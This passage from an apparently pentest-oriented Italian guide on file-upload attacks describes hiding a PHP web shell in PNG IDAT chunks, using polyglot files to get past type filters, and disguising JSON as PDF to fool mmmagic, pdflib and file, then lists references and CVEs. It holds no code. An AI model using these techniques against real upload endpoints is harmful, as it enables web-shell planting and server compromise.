Incorporare una PHP shell nello chunk IDAT di un file PNG può aggirare efficacemente alcune operazioni di image processing. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, poiché vengono comunemente usate per ridimensionare e risemplare le immagini, rispettivamente. La capacità della shell PHP incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo in alcuni scenari.

Un'esplorazione dettagliata di questa tecnica, inclusa la metodologia e le possibili applicazioni, è disponibile nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione approfondita del processo e delle sue implicazioni.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File Polyglot

I file polyglot fungono da strumenti unici in cybersecurity, comportandosi come camaleonti che possono esistere validamente in più formati di file simultaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come archivio RAR. Tali file non sono limitati a questa combinazione; sono possibili anche accoppiamenti come GIF e JS o PPT e JS.

L'utilità principale dei file polyglot risiede nella loro capacità di eludere le misure di sicurezza che filtrano i file in base al tipo. Una pratica comune in molte applicazioni consiste nel consentire solo determinati tipi di file per l'upload — come JPEG, GIF o DOC — per ridurre il rischio di formati potenzialmente pericolosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può aggirare furtivamente queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano limitazioni. Per esempio, mentre un polyglot potrebbe incarnare contemporaneamente un file PHAR (PHp ARchive) e un JPEG, il successo del suo upload potrebbe dipendere dalle politiche sulle estensioni del sistema. Se la piattaforma è rigorosa sulle estensioni consentite, la mera dualità strutturale di un polyglot potrebbe non essere sufficiente a garantirne l'upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Caricare JSON validi come se fossero PDF

Come evitare il rilevamento del tipo di file caricando un JSON valido anche se non consentito, fingendo che sia un PDF (tecniche da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è considerato valido (vedi esempio nel post)
- **`pdflib` library**: Inserire un formato PDF fittizio dentro un campo del JSON in modo che la library pensi sia un PDF (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Crea semplicemente un JSON più grande di tale dimensione in modo che non riesca a parsare il contenuto come JSON e poi, all'interno del JSON, inserisci la parte iniziale di un PDF reale e lo considererà un PDF

## Riferimenti

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
